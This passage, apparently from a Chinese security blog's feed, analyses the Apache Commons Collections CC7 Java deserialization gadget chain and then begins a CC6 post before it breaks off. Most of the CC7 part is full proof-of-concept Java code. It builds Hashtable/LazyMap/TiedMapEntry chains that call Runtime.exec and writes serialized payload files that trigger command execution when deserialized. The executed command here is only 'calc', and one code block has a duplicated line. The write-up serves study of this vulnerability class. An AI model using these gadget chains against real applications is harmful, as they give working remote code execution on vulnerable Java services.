(!value.equals(m.get(key)))</code>判断体中的<code>m.get(key)</code>方法，而<code>m</code>对象由传入的<code>Object</code>对象，也就是上面分析传入对比<code>equals()</code>方法中的对象，即<code>Lazymap</code>对象，实际调用<code>Lazymap.get(key)</code>，达到代码执行的目的。</p><h3 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h3><p>上面几个关键的方法分析完了，从POC构造继续串联起来分析<br>首先触发点不变</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>接着就是<code>Lazymap</code>的传值和对<code>hashtable</code>之间的衔接，在上面方法的分析中提到<code>reconstitutionPut()</code>方法中需要满足</p><ul><li><code>value</code>不能为空，设置<code>value</code>值就行。</li><li>需要<code>index</code>相同且<code>e.hash == hash</code>，也就是在<code>table</code>表中需要有两个元素的<code>hash</code>是相等的，<code>hash</code>相等才能获取到<code>table</code>中的元素，才能去执行<code>e.key.equals(key)</code>这个方法，因此必须<code>put</code>进两个<code>hash</code>相等的元素。</li></ul><p><img src="/posts/40ba40f0/cc7-4.png" title="满足条件"></p><p>由上满足条件，我们传入两个相同的元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChain);</span><br><span class="line">Lmap.put(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>但会遇到问题，如果传入两个相同的元素，由于<code>hashtable</code>的<code>put</code>操作</p><p><img src="/posts/40ba40f0/cc7-5.png" title="put()"></p><p>其中针对第一个元素<code>put</code>入的时候，此时<code>Table</code>不存在其他元素，此时<code>index</code>指针获取的<code>table</code>为<code>null</code>，不会进入<code>for</code>循环体，直接进入<code>addEntry()</code>方法中</p><p><img src="/posts/40ba40f0/cc7-6.png" title="addEntry()"></p><p><code>addEntry()</code>方法将元素添加对应元素<code>hash</code>计算出来的<code>index</code>指针的<code>table</code>中，最后计数+1，表示<code>table</code>中新增了一个元素个数</p><p>如果添加两个一模一样的元素，就会导致在第二次<code>put</code>对象时，由于<code>hash</code>相同，计算的<code>index</code>相同，<code>key</code>值相同，进入到<code>put</code>方法的<code>for</code>循环中返回了，自然不会进行<code>addEntry()</code>添加操作，此时<code>table</code>表中元素个数仍为1。</p><p><img src="/posts/40ba40f0/cc7-12.png" title="第二次put"></p><p>在反序列化获取<code>elements</code>元素个数时，此时也为1，只进行一次<code>reconstitutionPut</code>方法调用。而需要调用第二次<code>reconstitutionPut</code>方法，判断里面的<code>hash</code>相同才能运行到<code>e.key.equals(key)</code>方法。</p><p><img src="/posts/40ba40f0/cc7-7.png" title="反序列化过程"></p><p>因此需要我们传入两个元素的hash相同，但是元素key不相同的两组元素</p><p>由上满足条件，我们传入两个元素的hash相同，但是元素key不相同的两组元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChain);</span><br><span class="line">Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="/posts/40ba40f0/cc7-8.png" title="hash相同的元素"></p><p>再解决本地触发的问题，由于在第二次<code>put</code>中会进入到循环体中执行<code>e.key.equals(key)</code>方法，会调用到<code>transformerChain.transform()</code>达到执行代码。</p><p>规避这个问题还是用老方法，先传入空的转换器进<code>Lazymap</code>对象中，<code>put</code>完值后再通过反射修改转换器。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个空的链转换器</span></span><br><span class="line">Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChainfake);</span><br><span class="line">Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//修改触发的转换器</span></span><br><span class="line">Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(Lmap2,transformerChain);</span><br></pre></td></tr></table></figure><p>由于<code>put</code>第二次的时候<code>e.key.equals(key)</code>中的<code>e.key</code>为第一次元素的<code>Key</code>，目的是拿第二次<code>put</code>的<code>key</code>查看是否跟表中的<code>key</code>是否相等，而参数中的<code>key</code>(第二次put入的key值)为最后调用的<code>m.get()</code>中的<code>m</code>对象，因此只需要修改第二个传入的<code>lazymap</code>对象的<code>factory</code>即可。</p><p><img src="/posts/40ba40f0/cc7-11.png" title="触发点对象"></p><p>还有个点就是由于在<code>put</code>入第二个<code>entry</code>元素时，调用了<code>e.key.equals(key)</code>方法，最后调用到<code>m.get(key)</code>即<code>Lazymap.get(key)</code>方法</p><p><img src="/posts/40ba40f0/cc7-9.png" title="Lazymap.get(key)"></p><p>由于转换器制空后，本地不会触发代码执行，但会进行<code>map.put(key, value);</code>，将第二个元素的<code>key</code>进行<code>put</code>操作，此时<code>Lazymap2</code>又新增了一个<code>key</code>为<code>yy</code>的元素，因此需要删除</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Lmap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/posts/40ba40f0/cc7-10.png" title="新增的yy"></p><p>最后将<code>hashtable</code>对象进行序列化，反序列化的时候触发漏洞，得到完整poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map Lmap2= LazyMap.decorate(map2,transformerChainfake);</span><br><span class="line">        Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">        ht.put(Lmap2,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//修改触发的转换器</span></span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap2,transformerChain);</span><br><span class="line">        Lmap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(ht);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="CC7-POC延伸"><a href="#CC7-POC延伸" class="headerlink" title="CC7-POC延伸"></a>CC7-POC延伸</h2><p>反序列化（readObject）过程中提到的<code>reconstitutionPut</code>方法</p><p><img src="/posts/40ba40f0/cc7-13.png" title="hashCode()"></p><p>在上面反序列化过程<code>reconstitutionPut</code>方法写入<code>entry</code>中发现一个敏感的<font color="red">key.hashCode()</font>，在cc6的学习中就是利用<code>hashmap.put(key,value)</code>调用<code>hash(key)</code>方法最后调用<code>key.hashcode()</code>进行调用达到代码执行。<br>同样在这里，key值可控，也是通过<code>hashtable</code>对象<code>put</code>入的<code>key</code>值进行<code>hashCode()</code>操作，跟cc6基本没差别，这就不再复分析一遍了。<br>得到一个延伸的poc<br>触发点不变</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>通过<code>lazymap</code>调用触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br></pre></td></tr></table></figure><p>再通过<code>TiedMapEntry</code>类最后调用<code>Lazymap.get()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>最后使用<code>hashtable</code>的<code>put</code>方法添加元素<code>TiedMapEntry</code>对象作为入口,通过反射修改<code>table</code>表<code>key</code>值去规避本地执行，同样可以通过反射修改链转换器，操作跟cc6分析写Poc的一样，这里就用反射修改<code>key</code>值了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"><span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Hashtable.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(ht);</span><br><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure><p>然后序列化，反序列化触发漏洞，得到完整POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Hashtable.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(ht);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7payload-1.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(ht);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7payload-1.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行效果：<br><img src="/posts/40ba40f0/cc7-1.png" title="执行效果"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>CC7相对于前面几个链，更换了入口，其中多层的equals方法调用，以及中间设置值绕了好一会，细节还是比较多，但理清过后还是比较容易理解，学习中间发现还有另外的延伸，能举一反三才是真正的进步。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a><br>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC6链学习与分析</title>
      <link href="/posts/9758c0a8.html"/>
      <url>/posts/9758c0a8.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC6也是在CC5的基础上，改变了入口，依旧单独列出来方便整理，写一起太乱了。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><p>CC6基于CC5的变式，改变了触发入口点，简述CC5的触发过程</p><h2 id="回顾CC5链"><a href="#回顾CC5链" class="headerlink" 